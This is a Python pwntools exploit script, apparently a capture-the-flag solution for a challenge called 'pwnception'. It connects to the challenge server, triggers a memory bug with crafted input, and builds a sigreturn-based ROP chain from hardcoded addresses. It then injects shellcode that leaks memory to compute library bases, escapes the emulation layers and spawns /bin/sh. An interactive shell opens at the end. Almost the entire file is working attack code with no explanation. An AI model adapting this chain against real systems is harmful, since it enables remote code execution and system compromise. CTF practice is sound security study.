from pwn import *

HOST, PORT = "pwnception.chal.perfect.blue", "1"
# HOST, PORT = "172.17.0.2", 1337
# HOST, PORT = '127.0.0.1', 31338
context.arch='amd64'
r = remote(HOST, PORT)

ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def base():
	r.send("""
	+[>,]
	>>>>>>>>
	>>>>>>>>
	>>>>>>>>
	+[,>,]
	!""")
	r.send("\x01" * 4095)
	r.send("\x00")
base()
sp = 0xFFFF8801FFFFE000-8
read = 0x00000000004009B0
sys=0x400d25
rax=0x400121
buf=0x7FFFFFEFF000 + 0x8000
buf2=0x7FFFFFEFF000
user_sp_base = 0x7FFFFFFFDFB0-8

def call(addr, sysno, arg0, arg1, arg2, index):
	frame = SigreturnFrame()
	frame.rax=sysno
	frame.rip=addr
	frame.rdi=arg0
	frame.rsi=arg1
	frame.rdx=arg2
	frame.rsp=user_sp_base + (index + 1) * (len(bytes(frame)) + 0x18)
	print(hex(frame.rsp))
	return [
	rax,15,
	sys,
	frame
	]

int0x70 = 0xFFFFFFFF810001DB
stage2 = flat([
	rax,
	buf,
	# rdi=rax, rax=rdi
	0x4009d3,
	# rbx, rbp, r12, r13
	0x400af3,
	0x1000, 0, 7, 0x400121,
	# rdx=r12, rsi=rbx, call r13
	0x4008bd,
	rax,
	10,
	int0x70,
])
stage2 += flat([buf + len(stage2) + 8])
stage2 += asm(r"""
#define _(x, y, z)\
mov rax, x;\
mov rdi, y;\
mov rsi, z;\
int 0x71;

lea rbp, [rip+tmp]
_(0, 0, 0)
_(3, 0, 0)
_(2, rbp, 0x100)

lea rsi, [rip+fmt]
mov rcx, 7
mov dx, 0x38f
rep outsb

lea rsi, [rip+tmp]
mov rcx, 0x100
rep outsb

#define SIZE 0xc0
_(0, SIZE, 0)
_(3, 0, 0)
mov rax, [rbp+0xc8]
mov [rbp], rax
sub qword ptr [rbp], 0x1b406
add qword ptr [rbp], -0x610000
mov rcx, [rbp]
add qword ptr [rbp], 0x3ed8e8 - 8
_(1, rbp, 8)

_(0, SIZE, 0)
_(0, SIZE, 0)
mov rax, [rip+cmd]
mov [rbp], rax
mov [rbp+8], rcx
add qword ptr [rbp+8], 0x4f550
_(1, rbp, 16)
_(3, 0, 0)
nop

fmt:
.asciz "hello!\n"
cmd:
.asciz "/bin/sh"
tmp:
""")
main=0x4005f1
_rop = flat([
	call(sys, 0, 0, buf, len(stage2), 0),
	call(sys, 0, 0, buf2, 8, 1),
	call(sys, (buf2 - 0xFFFFFFFF81000900 & (2 ** 64 - 1)) >> 3, 0, sp, 16, 2),
	main
])
encode = lambda x: b"\x01".join([bytes([x]) for x in x]) + b"\x00"
r.send(encode(_rop))
r.send(stage2)
r.send(p64(0xFFFFFFFF810000FC))
r.send(p64(0x400af6) + p64(buf - 8))
r.recvuntil('hello!\n')
data=r.recvn(0x100)
print(hexdump(data))
unicorn=u64(data[0xc8:][:8])-0x1b406
print(hex(unicorn))
r.interactive()
